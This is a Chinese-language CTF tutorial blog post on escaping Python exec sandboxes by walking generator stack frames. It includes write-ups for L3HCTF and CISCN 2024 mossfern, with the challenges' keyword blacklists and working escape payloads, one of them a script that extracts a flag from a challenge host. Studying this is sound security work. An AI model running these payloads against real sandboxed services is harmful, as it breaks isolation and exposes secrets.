---
title: "python利用栈帧进行沙箱逃逸"
onlyTitle: true
date: 2024-12-19 17:11:21
categories:
- python
tags:
- 栈帧逃逸
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8125.jpg
---



# python利用栈帧进行沙箱逃逸

copy copy copy!

## 生成器

生成器（Generator）是 Python 中一种特殊的迭代器，生成器可以使用 yield 关键字来定义。

yield 用于产生一个值，并在保留当前状态的同时暂停函数的执行。当下一次调用生成器时，函数会从上次暂停的位置继续执行，直到遇到下一个 yield 语句或者函数结束



* 用yield创建定义一个简单迭代器：

```python
def f():
    a=1
    while True:
        yield a
        a+=1
f=f()
print(next(f)) #1
print(next(f)) #2
print(next(f)) #3
```

把while换成for定义一个有限的迭代器：

```python
def f():
    a=1
    for i in range(100):
        yield a
        a+=1
f=f()
```

用循环能遍历迭代器：

```python
for value in f:
    print(value)
```

利用生成器表达式能简洁地创建一个生成器，省略yield：

```python
a=(i+1 for i in range(100))
#next(a)
for value in a:
    print(value)
```



>生成器的内置属性：
>
>* `gi_code`: 生成器对应的code对象。
>*  `gi_frame`: 生成器对应的frame（栈帧）对象。
>*  `gi_running`: 生成器函数是否在执行。生成器函数在yield以后、执行yield的下一行代码前处于frozen状态，此时这个属性的值为0。
>*  `gi_yieldfrom`：如果生成器正在从另一个生成器中 yield 值，则为该生成器对象的引用；否则为 None。
>*  `gi_frame.f_locals`：一个字典，包含生成器当前帧的本地变量。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241214114443583.png)

使用`gi_frame`指向生成器或协程当前执行的帧对象（frame object），如果这个生成器或协程正在执行的话。帧对象表示代码执行的当前上下文，包含了局部变量、执行的字节码指令等信息。

>每当 Python 解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。

比如使用`gi_frame`搭配以下栈帧属性就能获取一些内置变量

* `f_locals`: 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。
*  `f_globals`: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。
*  `f_code`: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。
*  `f_lasti`: 整数，表示最后执行的字节码指令的索引。
*  `f_back`: 指向上一级调用栈帧的引用，用于构建调用栈。

## 利用栈帧和f_back沙箱逃逸

example1：

```python
s3cret="this is flag"

codes='''
def waff():
    def f():
        yield g.gi_frame.f_back

    g = f()  #生成器
    frame = next(g) #获取到生成器的栈帧对象
    b = frame.f_back.f_back.f_globals['s3cret'] #返回并获取前一级栈帧的globals
    return b
b=waff()
'''
locals={}
code = compile(codes, "test", "exec")
exec(code,locals)
print(locals["b"])
```

通过生成器的栈帧对象通过f_back（返回前一帧）从而逃逸出去获取globals全局符号表，运行得到 `this is flag` ,成功逃逸出沙箱获取到`s3cret`变量值

`next(g)` 调用生成器 `g` 的 `__next__()` 方法，使其开始执行，直至遇到 `yield`。这里获取到的就是`g.gi_frame.f_back`。locals是沙箱变量值

但是下面这个example2就报错，为什么？

```python
s3cret="this is flag"

codes='''
def waff():
    def f():
        yield g.gi_frame

    g = f()  #生成器
    frame = next(g) #获取到生成器的栈帧对象
    b = frame.f_back.f_back.f_back.f_globals['s3cret'] #返回并获取前一级栈帧的globals
    return b
b=waff()
'''
locals={}
code = compile(codes, "test", "exec")
exec(code,locals)
print(locals["b"])
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241214115130325.png)

example1中：

* `g.gi_frame.f_back`指向waff栈帧，`frame.f_back`指向exec test沙箱栈帧，`frame.f_back.f_back`指向主函数栈帧

example2中：

* `g.gi_frame`指向f栈帧，退出f后该栈帧销毁，所以后续为None

so，以下代码也能执行，只要保证frame存在

```python
s3cret="this is flag"

codes='''
def waff():
    def f():
        yield g.gi_frame.f_back.f_back.f_back

    g = f()  #生成器
    frame = next(g) #获取到生成器的栈帧对象
    b = frame.f_globals['s3cret'] #返回并获取前一级栈帧的globals
    return b
b=waff()
'''
locals={}
code = compile(codes, "test", "exec")
exec(code,locals)
print(locals["b"])
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241214121736764.png)

这里s3cret字符串是全局变量的同时也是整个作用域的局部变量，因此也能用`f_locals['s3cret']`去获得

获取了globals后，可以进一步获取`__builtins__`模块，`__builtins__` 模块是 Python 解释器启动时自动加载的，其中包含了一系列内置函数、异常和其他内置对象。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241214142700624.png)



## 例题

### L3HCTF

源码如下，codes来自传参，注释已贴：

```python
import sys
import os

codes='''
<<codehere>>
'''

try:
    codes.encode("ascii")
except UnicodeEncodeError:
    exit(0)#检查用户代码是否包含非ascii字符，繁殖使用某些特殊字符绕过

if "__" in codes:
    print("__ bypass!!")
    exit(0)#过滤__

codes+="\nres=factorization(c)"#在用户代码末尾追加一行：res = factorization(c)
print(codes)
locals={"c":"696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863","__builtins__": None}
res=set()#初始化一个大的目标整数 c;禁用内置模块访问（通过设置 __builtins__ 为 None）

def blackFunc(oldexit):
    def func(event, args):
        blackList = ["process","os","sys","interpreter","cpython","open","compile","__new__","gc"]
        for i in blackList:
            if i in (event + "".join(str(s) for s in args)).lower():
                print("noooooooooo")
                print(i)
                oldexit(0)
    return func

code = compile(codes, "<judgecode>", "exec")
sys.addaudithook(blackFunc(os._exit))#用python 3.8的sys.addaudithook黑名单拦截关键字
exec(code,{"__builtins__": None},locals)
print(locals)

p=int(locals["res"][0])
q=int(locals["res"][1])#从用户代码的执行结果中提取两个因数 p 和 q
if(p>1e5 and q>1e5 and p*q==int("696287028823439285412516128163589070098246262909373657123513205248504673721763725782111252400832490434679394908376105858691044678021174845791418862932607425950200598200060291023443682438196296552959193310931511695879911797958384622729237086633102190135848913461450985723041407754481986496355123676762688279345454097417867967541742514421793625023908839792826309255544857686826906112897645490957973302912538933557595974247790107119797052793215732276223986103011959886471914076797945807178565638449444649884648281583799341879871243480706581561222485741528460964215341338065078004726721288305399437901175097234518605353898496140160657001466187637392934757378798373716670535613637539637468311719923648905641849133472394335053728987186164141412563575941433170489130760050719104922820370994229626736584948464278494600095254297544697025133049342015490116889359876782318981037912673894441836237479855411354981092887603250217400661295605194527558700876411215998415750392444999450257864683822080257235005982249555861378338228029418186061824474448847008690117195232841650446990696256199968716183007097835159707554255408220292726523159227686505847172535282144212465211879980290126845799443985426297754482370702756554520668240815554441667638597863")):
    print("Correct!",end="")
else:
    print("Wrong!",end="")
```

沙盒内置空了`__builtins__`，阻断了后续利用；且过滤了几个敏感关键字，不能用gc垃圾回收器去获取对象引用，也不能直接调os

我们传如下code先获取到沙箱外的globals：

```python
a=(a.gi_frame.f_back.f_back for i in [1])
a=[x for x in a][0]
globals=a.f_back.f_back.f_globals
```

为什么要用`[x for x in a][0]`?

因为本来是用next获取`g.gi_frame.f_back`的，但是next也属于builtins，一起被ban了，所以用for去获取（`for in`其实也是遍历迭代器）

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241214161833097.png)

题目要求5s完成质数分解（官方给出的factorization），完全分不了

利用`"_"*2+"builtins"+"_"*2`绕过对`__`的过滤

> 这里提一嘴，之前打华为杯awdp的时候，有个过滤os的利用 `"o"+"s"`绕过

过滤了沙箱内的`__builtins__`没过滤沙箱外的，所以先退回沙箱外栈帧再获取builtins

所以直接通过沙箱外`globals.__builtins__`修改int函数返回固定的p*q结果

```python
def fake_int(i):
    return 100001 * 100002
a=(a.gi_frame.f_back.f_back for i in [1])
a=[x for x in a][0]
builtin =a.f_back.f_back.f_globals["_"*2+"builtins"+"_"*2]
builtin.int=fake_int
```



### 2024ciscn mossfern

在线执行代码？

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241214171206575.png)

附件给了两个源码，同理我把注释贴代码里方便阅读

main.py：

```python
import os
import subprocess
from flask import Flask, request, jsonify
from uuid import uuid1

app = Flask(__name__)

runner = open("/app/runner.py", "r", encoding="UTF-8").read()
flag = open("/flag", "r", encoding="UTF-8").readline().strip()


@app.post("/run")
def run():
    id = str(uuid1())#为每次请求生成一个唯一 ID，用于文件命名，防止文件名冲突。
    try:
        data = request.json
        open(f"/app/uploads/{id}.py", "w", encoding="UTF-8").write(
            runner.replace("THIS_IS_SEED", flag).replace("THIS_IS_TASK_RANDOM_ID", id))
        open(f"/app/uploads/{id}.txt", "w", encoding="UTF-8").write(data.get("code", ""))#创建两个文件：{id}.py：基于 runner.py 模板动态生成，用于执行任务，替换了占位符 THIS_IS_SEED 和 THIS_IS_TASK_RANDOM_ID；{id}.txt：保存用户提交的代码片段。
        run = subprocess.run(
            ['python', f"/app/uploads/{id}.py"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=3
        )#执行生成的 Python 脚本
        result = run.stdout.decode("utf-8")
        error = run.stderr.decode("utf-8")#标准输出和标准错误输出捕获到 result 和 error 中
        print(result, error)


        if os.path.exists(f"/app/uploads/{id}.py"):
            os.remove(f"/app/uploads/{id}.py")
        if os.path.exists(f"/app/uploads/{id}.txt"):
            os.remove(f"/app/uploads/{id}.txt")#删除动态生成的文件
        return jsonify({
            "result": f"{result}\n{error}"
        })
    except:
        if os.path.exists(f"/app/uploads/{id}.py"):
            os.remove(f"/app/uploads/{id}.py")
        if os.path.exists(f"/app/uploads/{id}.txt"):
            os.remove(f"/app/uploads/{id}.txt")
        return jsonify({
            "result": "None"
        })


if __name__ == "__main__":
    app.run("0.0.0.0", 5000)
```

runner.py：

```python
#检查源码是否包含危险字符串。禁止非 ASCII 字符。
def source_simple_check(source):

    """
    Check the source with pure string in string, prevent dangerous strings
    :param source: source code
    :return: None
    """

    from sys import exit
    from builtins import print

    try:
        source.encode("ascii")
    except UnicodeEncodeError:
        print("non-ascii is not permitted")
        exit()

    for i in ["__", "getattr", "exit"]:
        if i in source.lower():
            print(i)
            exit()

#过滤函数
def block_wrapper():
    """
    Check the run process with sys.audithook, no dangerous operations should be conduct
    :return: None
    """

    def audit(event, args):

        from builtins import str, print
        import os

        for i in ["marshal", "__new__", "process", "os", "sys", "interpreter", "cpython", "open", "compile", "gc"]:
            if i in (event + "".join(str(s) for s in args)).lower():
                print(i)
                os._exit(1)
    return audit

#检查源码的字节码，确保没有加载全局变量 (LOAD_GLOBAL)、导入模块 (IMPORT_NAME) 或加载方法 (LOAD_METHOD) 的操作。
#如果发现这些操作且不属于白名单（randint、randrange、print、seed），则退出程序。
def source_opcode_checker(code):
    """
    Check the source in the bytecode aspect, no methods and globals should be load
    :param code: source code
    :return: None
    """

    from dis import dis
    from builtins import str
    from io import StringIO
    from sys import exit

    opcodeIO = StringIO()
    dis(code, file=opcodeIO)#通过 dis 模块生成源码的字节码，并将其逐行存储
    opcode = opcodeIO.getvalue().split("\n")
    opcodeIO.close()
    for line in opcode:
        if any(x in str(line) for x in ["LOAD_GLOBAL", "IMPORT_NAME", "LOAD_METHOD"]):
            if any(x in str(line) for x in ["randint", "randrange", "print", "seed"]):
                break
            print("".join([x for x in ["LOAD_GLOBAL", "IMPORT_NAME", "LOAD_METHOD"] if x in str(line)]))
            exit()


if __name__ == "__main__":

    from builtins import open
    from sys import addaudithook
    from contextlib import redirect_stdout
    from random import randint, randrange, seed
    from io import StringIO
    from random import seed
    from time import time

    source = open(f"/app/uploads/THIS_IS_TASK_RANDOM_ID.txt", "r").read()
    source_simple_check(source)
    source_opcode_checker(source)
    code = compile(source, "<sandbox>", "exec")
    addaudithook(block_wrapper())
    outputIO = StringIO()
    with redirect_stdout(outputIO):
        seed(str(time()) + "THIS_IS_SEED" + str(time()))
        exec(code, {
            "__builtins__": None,
            "randint": randint,
            "randrange": randrange,
            "seed": seed,
            "print": print
        }, None)#定义了一个受限执行环境（__builtins__ 被设置为 None，仅暴露少量白名单函数）；
    output = outputIO.getvalue()

    if "THIS_IS_SEED" in output:
        print("这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！")
        print("bad code-operation why still happened ah?")
    else:
        print(output)

```

代码流程也很简单：

1. 把runner.py的占位符THIS_IS_SEED换为flag，THIS_IS_TASK_RANDOM_ID换为id，保存为`{id}.py`。
2. run路由接收json参数，key=code对应的value作为代码保存到`{id}.txt`，然后用`{id}.py`去运行`{id}.txt`



flag在runner.py里就是`THIS_IS_SEED`替换的字符串，虽然flag是主进程定义的变量，沙箱逃逸不能从子进程越到主进程；但是经过替换已经导入到了runner.py进程

然后思考一下需要f_back多少层，画个栈图如下：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241219165727451.png)

所以三层能退回主函数

怎么获取已定义的flag变量？

在 Python 中，**`co_consts`** 是编译后代码对象（`code object`）的一个属性。它包含了 **字节码中定义的所有常量**。

最后如果flag在输出里，会直接被过滤

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241219170305797.png)

用print的end参数，逗号分割就完了

脚本如下：

```python
import requests

url = 'http://8e890316-d92c-4777-88d8-0cc1bddb35a3.challenge.ctf.show/run'
data = {
    "code": '''
def exp():
    def scq():
        yield scq.gi_frame.f_back
    scq = scq()
    frame = [x for x in scq][0]
    gattr = frame.f_back.f_back.f_back.f_globals['_'+'_builtins_'+'_']# jail
    s = gattr.str
    for i in s(frame.f_back.f_back.f_back.f_code.co_consts):
        print(i, end = ",")
exp()
'''
}

response = requests.post(url, json=data)
print(response.json())
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241215213822847.png)

本地不知道什么原因一样的payload跑不出
